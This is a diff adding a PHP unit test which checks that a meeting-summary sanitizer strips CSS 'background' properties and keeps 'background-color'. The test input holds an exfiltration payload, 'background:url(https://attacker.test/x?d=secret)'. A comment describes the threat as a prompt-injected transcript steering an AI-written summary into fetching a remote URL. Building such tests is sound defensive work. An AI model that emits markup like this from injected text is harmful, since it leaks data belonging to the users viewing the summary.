@@ -132,6 +132,21 @@ class SallyMeetingInsightServiceTest extends TestCase
         $this->assertStringContainsString('ql-align-center', $clean);
     }
 
+    public function test_sanitize_summary_drops_background_but_keeps_background_color(): void
+    {
+        // `background` carries url(...), which would make the browser fetch a
+        // remote URL chosen by a prompt-injected transcript. background-color
+        // is inert and stays available to the editor toolbar.
+        $clean = SallyMeetingInsightService::sanitizeSummary(
+            '<p style="background-color:#ff0000">red</p>'
+            .'<p style="background:url(https://attacker.test/x?d=secret)">fetched</p>',
+        );
+
+        $this->assertStringContainsString('background-color', $clean);
+        $this->assertStringNotContainsString('attacker.test', $clean);
+        $this->assertStringNotContainsString('background:url', $clean);
+    }
+
     public function test_serializer_exposes_the_meeting_timezone(): void
     {
         $leadId = $this->makeLead();
